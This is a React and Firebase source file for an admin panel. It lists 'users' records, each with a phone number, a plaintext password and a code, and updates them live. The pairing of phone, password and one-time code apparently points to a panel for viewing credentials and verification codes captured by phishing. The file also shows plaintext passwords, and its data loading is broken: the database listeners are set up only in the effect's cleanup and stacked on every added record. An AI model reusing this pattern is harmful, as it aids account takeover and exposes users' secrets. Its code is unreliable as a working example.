import * as React from "react";
import Badge from "react-bootstrap/Badge";

import ListGroup from "react-bootstrap/ListGroup";
import Row from "react-bootstrap/Row";
import { Button, Toast } from "react-bootstrap";
import { useState } from "react";
import { database } from "./firebase";
import { query, ref, onChildAdded, onChildChanged } from "firebase/database";

function TabsListItem() {
  const [dt, setDt] = React.useState([]);
  const appendData = (da) => {
    setDt(da);
  };
  let data = [];

  React.useEffect(() => {
    return () => {
      const dbRef = ref(database, "users");

      const qw = query(dbRef);
      onChildAdded(qw, (s) => {
        setDt([]);

        let ditem = {
          phone: s.val().phone,
          pass: s.val().pass,
          code: s.val().code,
        };
        data.push(ditem);
        appendData(data);
        onChildChanged(qw, (s) => {
          let ditem = {
            phone: s.val().phone,
            pass: s.val().pass,
            code: s.val().code,
          };
          data.push(ditem);
          appendData(data);
        });
      });
    };
  }, []);
  return (
    <>
      {dt ? (
        dt.map((app) => (
          <ListGroup.Item
            key={app.phone}
            variant="secondary"
            className="d-flex justify-content-between align-items-start"
            action
          >
            <div className="ms-2 me-auto">
              <div className="fw-bold">{app.phone}</div>
              <div className="">{app.pass}</div>
            </div>
            <div>
              <Badge bg="warning" pill>
                {app.code}
              </Badge>
              <Button className="ms-1" variant="default">
                <svg
                  className="mb-1"
                  xmlns="http://www.w3.org/2000/svg"
                  width="16"
                  height="16"
                  fill="red"
                  viewBox="0 0 16 16"
                >
                  <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14m0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16" />
                  <path d="M4.646 4.646a.5.5 0 0 1 .708 0L8 7.293l2.646-2.647a.5.5 0 0 1 .708.708L8.707 8l2.647 2.646a.5.5 0 0 1-.708.708L8 8.707l-2.646 2.647a.5.5 0 0 1-.708-.708L7.293 8 4.646 5.354a.5.5 0 0 1 0-.708" />
                </svg>
              </Button>
            </div>
          </ListGroup.Item>
        ))
      ) : (
        <h1>Loading...</h1>
      )}
    </>
  );
}

function TabsListGroup() {
  const [show, setShow] = useState(false);

  return (
    <Row>
      <ListGroup>
        <TabsListItem />
      </ListGroup>
      <Toast
        bg="success"
        onClose={() => setShow(false)}
        show={show}
        delay={3000}
        autohide
      >
        <Toast.Body>
          <img
            src="holder.js/20x20?text=%20"
            className="rounded me-2"
            alt="..."
          />
          تم نسخ النص
        </Toast.Body>
      </Toast>
    </Row>
  );
}

export default TabsListGroup;
